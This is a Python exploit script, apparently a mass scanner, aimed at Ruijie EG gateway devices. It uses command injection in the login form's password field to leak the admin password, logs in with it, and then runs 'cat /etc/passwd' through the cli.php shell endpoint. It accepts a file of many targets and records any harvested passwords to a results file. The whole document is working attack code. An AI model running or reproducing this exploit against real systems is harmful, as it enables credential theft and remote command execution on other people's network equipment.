#!/usr/bin/python3
#-*- coding:utf-8 -*-

import re
import requests
import argparse
import operator
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

key=0
def header():
	print('\033[32m!***********************************************!\033[0m')
	print('\033[34m!description:锐捷EG易网关后台cli.php命令执行    !\033[0m')
	print('\033[34m!             Author:Fly_Wuhoo                  !\033[0m')
	print('\033[32m!***********************************************!\033[0m')

def Arg_Parse():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	parser.add_argument("-f","--file",metavar='',help="目标地址文件")
	args = parser.parse_args()
	return args

def Write_Results(url,passwd):
	with open('results.txt','a+') as wp:
		wp.write(url+'\n')
		wp.write("密码为：{}\n".format(passwd))

def Detect(url):
	vuln_url=url+"/login.php"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded"
	}
	data = 'username=admin&password=admin?show+webmaster+user'
	print("\033[32m正在检测:{}\033[0m".format(vuln_url))
	try:
		r=requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
		if r.status_code==200 and "data" in r.text:
			print("\033[31m{}存在漏洞！！！\033[0m".format(url))
			password=re.findall(r'admin (.*?)"',r.text)[0]
			print("\033[31m密码是： {}\033[0m".format(password))
			if key:
				Write_Results(url,password)
			else:
				pass
			print("\033[33m正在尝试登录！！！ \033[0m")
			login(url,password)
			
		else:
			print("\033[32m未检测到该漏洞存在！！！ \033[0m")
	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(url))

def login(url,password):
	vuln_url=url+"/login.php"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded"
	}
	data = 'username=admin&password={}'.format(password)
	r=requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
	if r.status_code==200 and operator.eq(re.findall(r'data":"(.*?)"',r.text)[0],'0') and operator.eq(re.findall(r'status":(.*?)}',r.text)[0],'1'):
		print("\033[31m登录成功，开始尝试命令执行！！！\033[0m")
		cookie=r.headers['Set-Cookie'].replace(' path=/,','')+';'
		RCE(url,cookie)
	else:
		print("\033[33m登录失败，请手工尝试！！！ \033[0m")
	

def RCE(url,cookie):
	vuln_url=url+'/cli.php?a=shell'
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie":cookie
	}
	data='notdelay=true&command=cat /etc/passwd'
	try:
		r=requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
		#print(r.text)
		if r.status_code==200 and 'root:' in r.text:
			print("\033[31m{}存在后台命令执行漏洞！！！\033[0m".format(url))
			if key:
				with open('results.txt','a+') as wp:
					wp.write('存在后台命令执行漏洞\n')
			else:
				pass
		else:
			print("\033[33m命令执行验证失败，请手工尝试！！！ \033[0m")
	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))	

if __name__ == '__main__':
	args = Arg_Parse()
	header()
	if args.url:
		Detect(args.url)	
	elif args.file:
		key=1
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")